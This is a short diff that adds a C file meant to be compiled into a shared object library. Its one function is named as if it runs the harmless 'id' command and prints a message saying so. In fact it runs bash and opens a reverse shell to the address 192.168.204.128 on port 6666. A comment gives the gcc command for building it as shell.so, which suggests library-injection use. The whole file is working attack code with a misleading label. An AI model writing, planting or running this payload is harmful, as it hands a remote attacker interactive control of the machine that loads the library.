@@ -1,0 +1,12 @@
+#include <stdio.h>
+#include <unistd.h>
+
+// Run the following command to compile the code into a shared object file
+// gcc -shared -o shell.so shell c -fPIC
+
+void executeIDCommand() {
+    printf("Executing id command:\n");
+    fflush(stdout);
+    
+    execl("/usr/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/192.168.204.128/6666 0>&1", (char*)NULL);
+}
